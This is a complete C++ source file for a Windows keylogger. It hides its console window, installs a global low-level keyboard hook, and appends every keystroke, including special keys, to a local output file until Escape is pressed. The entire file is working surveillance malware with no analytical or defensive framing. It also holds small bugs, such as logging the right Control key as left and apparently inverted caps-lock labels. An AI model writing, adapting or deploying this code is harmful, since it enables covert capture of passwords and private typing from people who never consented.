#define PATH "..\\KeyLogger_OUTFILE.txt"  // path to output file location
#include <iostream>
#include <Windows.h>
#include <fstream>
HHOOK keyboardHook;
void hide();
void show();
bool saveToFile(DWORD key);
LRESULT CALLBACK keyboardHookProc(int nCode, WPARAM wParam, LPARAM lParam);

int main()
{
	hide();
	keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, keyboardHookProc, NULL, NULL);
	MSG Msg;
	while (GetMessage(&Msg, NULL, 0, 0)) // empties console window
	{
			TranslateMessage(&Msg);
			DispatchMessage(&Msg);
	}
}

bool saveToFile(DWORD key)
{
	FILE* OUTPUT_FILE = fopen(PATH, "a+");
	if (OUTPUT_FILE == NULL)
		return false;
	else if (key == VK_ESCAPE)
	{
		UnhookWindowsHookEx(keyboardHook);
		fclose(OUTPUT_FILE);
		exit(1);
	}
	else if (key == VK_TAB)
		fprintf(OUTPUT_FILE, "%s", "[TAB]");
	else if (key == VK_SPACE)
		fprintf(OUTPUT_FILE, "%s", "[SPACE]");
	else if (key == VK_RETURN)
		fprintf(OUTPUT_FILE, "%s", "[ENTER]");
	else if (key == VK_BACK)
		fprintf(OUTPUT_FILE, "%s", "[BACKSPACE]");
	else if (key == VK_DELETE)
		fprintf(OUTPUT_FILE, "%s", "[DELETE]");
	else if (key == VK_LCONTROL)
		fprintf(OUTPUT_FILE, "%s", "[LEFT CONTROL]");
	else if (key == VK_RCONTROL)
		fprintf(OUTPUT_FILE, "%s", "[LEFT CONTROL]");
	else if (key == VK_LSHIFT)
		fprintf(OUTPUT_FILE, "%s", "[LEFT SHIFT]");
	else if (key == VK_RSHIFT)
		fprintf(OUTPUT_FILE, "%s", "[RIGHT SHIFT]");
	else if (key == VK_CAPITAL)
	{
		if ((GetKeyState(VK_CAPITAL) & 0x0001) == 0)
			fprintf(OUTPUT_FILE, "%s", "[CAPS LOCK ON]");
		else
			fprintf(OUTPUT_FILE, "%s", "[CAPS LOCK OFF]");
	}
	else
		fprintf(OUTPUT_FILE, "%s", &key);
	fclose(OUTPUT_FILE);
	return true;
}

LRESULT CALLBACK keyboardHookProc(int nCode, WPARAM wParam, LPARAM lParam)
{
	PKBDLLHOOKSTRUCT key = (PKBDLLHOOKSTRUCT)lParam;
	if (wParam == WM_KEYDOWN && nCode == HC_ACTION)
	{
		if ((GetKeyState(VK_CAPITAL) & 0x0001) == 0)
			key->vkCode = char(tolower(key->vkCode));
		saveToFile(key->vkCode);
				
	}
	return CallNextHookEx(NULL, nCode, wParam, lParam);
}
static void hide()
{
	ShowWindow(GetConsoleWindow(), SW_HIDE);
}

static void show()
{
	ShowWindow(GetConsoleWindow(), SW_SHOW);
}